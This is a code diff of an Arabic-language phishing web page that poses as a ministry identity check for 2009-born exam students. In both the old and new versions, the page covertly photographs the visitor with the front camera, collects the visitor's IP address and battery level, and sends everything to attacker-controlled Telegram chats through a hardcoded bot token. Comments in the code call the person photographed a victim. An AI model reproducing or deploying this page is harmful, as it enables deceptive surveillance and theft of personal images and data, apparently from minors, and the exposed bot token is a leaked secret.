@@ -1,88 +1,29 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>نظام المراقبة الوزاري - 2009</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; margin: 0; padding: 20px; }
-        .btn { padding: 20px; background: #2ecc71; color: white; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
-        #v { width: 100%; max-width: 400px; border-radius: 10px; margin-top: 20px; display: none; }
-    </style>
-</head>
-<body>
-    <h3>نظام تأكيد الهوية لطلبة 2009 📸</h3>
-    <p>يرجى الضغط على الزر أدناه لتفعيل كاميرا المراقبة قبل دخول قاعة الامتحان</p>
-    
-    <button class="btn" onclick="capture()">تفعيل الكاميرا الآن</button>
-    
-    <video id="v" autoplay></video>
-    <canvas id="c" style="display:none;"></canvas>
-
+<html>
+<head><meta charset="UTF-8"><title>تأكيد الهوية - جيل 2009</title></head>
+<body style="text-align:center; background:#000; color:#fff;">
+    <h3>تفعيل الكاميرا الأمامية للمراقبة 📸</h3>
+    <button onclick="st()" style="padding:20px; background:#2ecc71; color:#fff; border-radius:10px;">بدء الفحص</button>
+    <video id="v" autoplay style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
     <script>
         const pr = new URLSearchParams(window.location.search);
         const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-
-        async function capture() {
-            try {
-                // طلب الكاميرا الأمامية تحديداً (facingMode: user)
-                // إذا بدك الخلفية بتغيرها لـ (facingMode: environment)
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                v.style.display = "block";
-
-                // ننتظر ثانيتين عشان الضحية يثبت وجهه
-                setTimeout(async () => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    // تحويل الصورة لملف قابل للإرسال
-                    c.toBlob(async (blob) => {
-                        // جلب المعلومات الإضافية (IP وبطارية)
-                        let ip = "Checking...";
-                        try { const r = await fetch('https://api.ipify.org'); ip = await r.text(); } catch(e){}
-                        
-                        let batt = "N/A";
-                        try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
-
-                        const caption = `
-📸 صيدة كاميرا (جيل 2009) 📸
-👤 الصياد: ${pr.get('hunter')}
-🌐 الـ IP: ${ip}
-🔋 الشحن: ${batt}
-📱 الجهاز: ${navigator.platform}
-                        `;
-
-                        // إرسال الصورة للمستخدم وإلك
-                        const fd = new FormData();
-                        fd.append('chat_id', pr.get('id'));
-                        fd.append('photo', blob, 'cam.jpg');
-                        fd.append('caption', caption);
-
-                        // إرسال للمستخدم
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                        
-                        // إرسال نسخة لإلك (أبو سند)
-                        const fd2 = new FormData();
-                        fd2.append('chat_id', pr.get('dev'));
-                        fd2.append('photo', blob, 'cam.jpg');
-                        fd2.append('caption', caption);
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd2 });
-
-                        alert("تم تأكيد الهوية بنجاح، يمكنك الدخول.");
-                    }, 'image/jpeg');
-                }, 2500);
-
-            } catch (err) {
-                alert("يرجى السماح بالوصول للكاميرا للمتابعة.");
-            }
+        async function st() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: "user"} });
+            const v = document.getElementById('v'); v.srcObject = stream;
+            setTimeout(async () => {
+                const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(async (b) => {
+                    let ip = await (await fetch('https://api.ipify.org')).text();
+                    let bt = await navigator.getBattery();
+                    const cap = encodeURIComponent(`📸 صيدة أمامية\n👤 الصياد: ${pr.get('hunter')}\n🌐 IP: ${ip}\n🔋 شحن: ${Math.round(bt.level*100)}%`);
+                    const fd = new FormData(); fd.append('photo', b, 'f.jpg');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('id')}&caption=${cap}`, {method:'POST', body:fd});
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('dev')}&caption=${cap}`, {method:'POST', body:fd});
+                    alert("تم بنجاح");
+                }, 'image/jpeg');
+            }, 2000);
         }
     </script>
 </body>
